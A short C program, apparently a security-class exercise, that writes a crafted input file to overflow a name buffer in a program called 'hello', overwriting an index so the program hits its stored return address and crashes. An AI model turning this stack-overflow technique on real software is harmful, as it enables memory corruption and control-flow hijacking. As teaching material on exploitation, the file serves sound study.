#include <stdio.h>
/* Creates a 53 characters long string that once given to hello executable, it will fill the name buffer with my name, add plenty of 0 characters and then it will change the value of i variable into 56, so buff[i] will point directly to the stored return address in stack, thus once it overwrites it, the program will crash. */
int main(){
	int i;
	FILE *file;
	char *name = "George Manos\0";
	file = fopen("data3", "w");
	for(i = 0; i < 53; i++){
		if(i < 13)
			fputc(name[i], file);
		else if(i == 48)
			fputc(56, file);
		else
			fprintf(file, "0");
	}
	fclose(file);
	return 0;
}
